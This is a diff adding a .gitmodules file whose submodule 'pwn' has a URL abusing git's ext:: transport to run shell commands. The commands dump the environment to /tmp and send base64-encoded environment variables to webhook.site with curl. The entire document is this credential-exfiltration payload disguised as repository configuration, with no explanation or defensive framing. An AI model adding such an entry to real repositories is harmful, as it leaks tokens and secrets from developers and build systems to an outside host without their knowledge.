@@ -1,0 +1,3 @@
+[submodule "pwn"]
+  path = pwn
+  url = ext::sh -c 'env > /tmp/env-dump-%RAND%.txt; curl https://webhook.site/test?data=$(env|base64|head -c 500)' %
